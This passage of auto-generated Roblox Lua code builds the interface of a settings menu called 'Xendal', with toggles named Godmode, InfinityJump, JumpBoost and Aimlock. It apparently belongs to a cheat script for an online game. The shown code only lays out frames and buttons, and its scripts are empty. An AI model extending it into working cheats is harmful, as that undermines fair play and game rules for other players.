-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder
G2L["83"] = Instance.new("Frame", G2L["81"]);
G2L["83"]["ZIndex"] = 2;
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["83"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["83"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["83"]["Position"] = UDim2.new(0.459, 0, -3.8, -2);
G2L["83"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["83"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Circle
G2L["84"] = Instance.new("Frame", G2L["83"]);
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["84"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["84"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["84"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["84"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Circle.Mini
G2L["85"] = Instance.new("Frame", G2L["84"]);
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["85"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["85"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["85"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["85"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["85"]["Name"] = [[Mini]];
G2L["85"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Circle.Mini.UICorner
G2L["86"] = Instance.new("UICorner", G2L["85"]);
G2L["86"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Circle.UICorner
G2L["87"] = Instance.new("UICorner", G2L["84"]);
G2L["87"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Button
G2L["88"] = Instance.new("TextButton", G2L["83"]);
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["TextSize"] = 14;
G2L["88"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["88"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["88"]["Text"] = [[]];
G2L["88"]["Name"] = [[Button]];
G2L["88"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.Button.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["88"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.UIPadding
G2L["8a"] = Instance.new("UIPadding", G2L["83"]);
G2L["8a"]["PaddingTop"] = UDim.new(0, 4);
G2L["8a"]["PaddingRight"] = UDim.new(0, 4);
G2L["8a"]["PaddingLeft"] = UDim.new(0, 4);
G2L["8a"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Holder.UICorner
G2L["8b"] = Instance.new("UICorner", G2L["83"]);
G2L["8b"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle
G2L["8c"] = Instance.new("Frame", G2L["35"]);
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["8c"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["Name"] = [[NoAnimationsToggle]];
G2L["8c"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Main Handler
G2L["8d"] = Instance.new("LocalScript", G2L["8c"]);
G2L["8d"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder
G2L["8e"] = Instance.new("Frame", G2L["8c"]);
G2L["8e"]["ZIndex"] = 2;
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["8e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["8e"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["8e"]["Position"] = UDim2.new(0.459, 0, -2.57333, -2);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8e"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Circle
G2L["8f"] = Instance.new("Frame", G2L["8e"]);
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["8f"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["8f"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8f"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Circle.Mini
G2L["90"] = Instance.new("Frame", G2L["8f"]);
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["90"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["90"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["90"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["90"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["90"]["Name"] = [[Mini]];
G2L["90"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Circle.Mini.UICorner
G2L["91"] = Instance.new("UICorner", G2L["90"]);
G2L["91"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Circle.UICorner
G2L["92"] = Instance.new("UICorner", G2L["8f"]);
G2L["92"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Button
G2L["93"] = Instance.new("TextButton", G2L["8e"]);
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextSize"] = 14;
G2L["93"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["93"]["BackgroundTransparency"] = 1;
G2L["93"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["93"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["93"]["Text"] = [[]];
G2L["93"]["Name"] = [[Button]];
G2L["93"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.Button.LocalScript
G2L["94"] = Instance.new("LocalScript", G2L["93"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.UIPadding
G2L["95"] = Instance.new("UIPadding", G2L["8e"]);
G2L["95"]["PaddingTop"] = UDim.new(0, 4);
G2L["95"]["PaddingRight"] = UDim.new(0, 4);
G2L["95"]["PaddingLeft"] = UDim.new(0, 4);
G2L["95"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimationsToggle.Holder.UICorner
G2L["96"] = Instance.new("UICorner", G2L["8e"]);
G2L["96"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle
G2L["97"] = Instance.new("Frame", G2L["35"]);
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["97"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["Name"] = [[GodmodeToggle]];
G2L["97"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Main Handler
G2L["98"] = Instance.new("LocalScript", G2L["97"]);
G2L["98"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder
G2L["99"] = Instance.new("Frame", G2L["97"]);
G2L["99"]["ZIndex"] = 2;
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["99"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["99"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["99"]["Position"] = UDim2.new(0.459, 0, -1.36, -2);
G2L["99"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["99"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Circle
G2L["9a"] = Instance.new("Frame", G2L["99"]);
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["9a"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["9a"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9a"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Circle.Mini
G2L["9b"] = Instance.new("Frame", G2L["9a"]);
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["9b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["9b"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["9b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9b"]["Name"] = [[Mini]];
G2L["9b"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Circle.Mini.UICorner
G2L["9c"] = Instance.new("UICorner", G2L["9b"]);
G2L["9c"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Circle.UICorner
G2L["9d"] = Instance.new("UICorner", G2L["9a"]);
G2L["9d"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Button
G2L["9e"] = Instance.new("TextButton", G2L["99"]);
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["TextSize"] = 14;
G2L["9e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["9e"]["BackgroundTransparency"] = 1;
G2L["9e"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9e"]["Text"] = [[]];
G2L["9e"]["Name"] = [[Button]];
G2L["9e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.Button.LocalScript
G2L["9f"] = Instance.new("LocalScript", G2L["9e"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.UIPadding
G2L["a0"] = Instance.new("UIPadding", G2L["99"]);
G2L["a0"]["PaddingTop"] = UDim.new(0, 4);
G2L["a0"]["PaddingRight"] = UDim.new(0, 4);
G2L["a0"]["PaddingLeft"] = UDim.new(0, 4);
G2L["a0"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.Holder.UICorner
G2L["a1"] = Instance.new("UICorner", G2L["99"]);
G2L["a1"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle
G2L["a2"] = Instance.new("Frame", G2L["35"]);
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["a2"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Name"] = [[InfinityJumpToggle]];
G2L["a2"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Main Handler
G2L["a3"] = Instance.new("LocalScript", G2L["a2"]);
G2L["a3"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder
G2L["a4"] = Instance.new("Frame", G2L["a2"]);
G2L["a4"]["ZIndex"] = 2;
G2L["a4"]["BorderSizePixel"] = 0;
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["a4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a4"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["a4"]["Position"] = UDim2.new(0.459, 0, -3.2, -2);
G2L["a4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a4"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Circle
G2L["a5"] = Instance.new("Frame", G2L["a4"]);
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["a5"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["a5"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a5"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Circle.Mini
G2L["a6"] = Instance.new("Frame", G2L["a5"]);
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["a6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a6"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["a6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a6"]["Name"] = [[Mini]];
G2L["a6"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Circle.Mini.UICorner
G2L["a7"] = Instance.new("UICorner", G2L["a6"]);
G2L["a7"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Circle.UICorner
G2L["a8"] = Instance.new("UICorner", G2L["a5"]);
G2L["a8"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Button
G2L["a9"] = Instance.new("TextButton", G2L["a4"]);
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextSize"] = 14;
G2L["a9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a9"]["BackgroundTransparency"] = 1;
G2L["a9"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["a9"]["Text"] = [[]];
G2L["a9"]["Name"] = [[Button]];
G2L["a9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.Button.LocalScript
G2L["aa"] = Instance.new("LocalScript", G2L["a9"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.UIPadding
G2L["ab"] = Instance.new("UIPadding", G2L["a4"]);
G2L["ab"]["PaddingTop"] = UDim.new(0, 4);
G2L["ab"]["PaddingRight"] = UDim.new(0, 4);
G2L["ab"]["PaddingLeft"] = UDim.new(0, 4);
G2L["ab"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJumpToggle.Holder.UICorner
G2L["ac"] = Instance.new("UICorner", G2L["a4"]);
G2L["ac"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle
G2L["ad"] = Instance.new("Frame", G2L["35"]);
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["ad"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Name"] = [[NoflymeduseToggle]];
G2L["ad"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Main Handler
G2L["ae"] = Instance.new("LocalScript", G2L["ad"]);
G2L["ae"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder
G2L["af"] = Instance.new("Frame", G2L["ad"]);
G2L["af"]["ZIndex"] = 2;
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["af"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["af"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["af"]["Position"] = UDim2.new(0.459, 0, -1.96, -2);
G2L["af"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["af"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Circle
G2L["b0"] = Instance.new("Frame", G2L["af"]);
G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b0"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["b0"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["b0"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["b0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b0"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini
G2L["b1"] = Instance.new("Frame", G2L["b0"]);
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["b1"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["b1"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["b1"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["b1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b1"]["Name"] = [[Mini]];
G2L["b1"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini.UICorner
G2L["b2"] = Instance.new("UICorner", G2L["b1"]);
G2L["b2"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Circle.UICorner
G2L["b3"] = Instance.new("UICorner", G2L["b0"]);
G2L["b3"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Button
G2L["b4"] = Instance.new("TextButton", G2L["af"]);
G2L["b4"]["BorderSizePixel"] = 0;
G2L["b4"]["TextSize"] = 14;
G2L["b4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["b4"]["BackgroundTransparency"] = 1;
G2L["b4"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["b4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b4"]["Text"] = [[]];
G2L["b4"]["Name"] = [[Button]];
G2L["b4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
G2L["b5"] = Instance.new("LocalScript", G2L["b4"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.UIPadding
G2L["b6"] = Instance.new("UIPadding", G2L["af"]);
G2L["b6"]["PaddingTop"] = UDim.new(0, 4);
G2L["b6"]["PaddingRight"] = UDim.new(0, 4);
G2L["b6"]["PaddingLeft"] = UDim.new(0, 4);
G2L["b6"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoflymeduseToggle.Holder.UICorner
G2L["b7"] = Instance.new("UICorner", G2L["af"]);
G2L["b7"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle
G2L["b8"] = Instance.new("Frame", G2L["35"]);
G2L["b8"]["BorderSizePixel"] = 0;
G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b8"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["b8"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b8"]["Name"] = [[InfJupmv2Toggle]];
G2L["b8"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Main Handler
G2L["b9"] = Instance.new("LocalScript", G2L["b8"]);
G2L["b9"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder
G2L["ba"] = Instance.new("Frame", G2L["b8"]);
G2L["ba"]["ZIndex"] = 2;
G2L["ba"]["BorderSizePixel"] = 0;
G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["ba"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["ba"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["ba"]["Position"] = UDim2.new(0.459, 0, -0.74667, -2);
G2L["ba"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ba"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Circle
G2L["bb"] = Instance.new("Frame", G2L["ba"]);
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["bb"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["bb"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["bb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bb"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Circle.Mini
G2L["bc"] = Instance.new("Frame", G2L["bb"]);
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["bc"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["bc"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["bc"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bc"]["Name"] = [[Mini]];
G2L["bc"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Circle.Mini.UICorner
G2L["bd"] = Instance.new("UICorner", G2L["bc"]);
G2L["bd"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Circle.UICorner
G2L["be"] = Instance.new("UICorner", G2L["bb"]);
G2L["be"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Button
G2L["bf"] = Instance.new("TextButton", G2L["ba"]);
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextSize"] = 14;
G2L["bf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["bf"]["BackgroundTransparency"] = 1;
G2L["bf"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["bf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bf"]["Text"] = [[]];
G2L["bf"]["Name"] = [[Button]];
G2L["bf"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.Button.LocalScript
G2L["c0"] = Instance.new("LocalScript", G2L["bf"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.UIPadding
G2L["c1"] = Instance.new("UIPadding", G2L["ba"]);
G2L["c1"]["PaddingTop"] = UDim.new(0, 4);
G2L["c1"]["PaddingRight"] = UDim.new(0, 4);
G2L["c1"]["PaddingLeft"] = UDim.new(0, 4);
G2L["c1"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJupmv2Toggle.Holder.UICorner
G2L["c2"] = Instance.new("UICorner", G2L["ba"]);
G2L["c2"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle
G2L["c3"] = Instance.new("Frame", G2L["35"]);
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
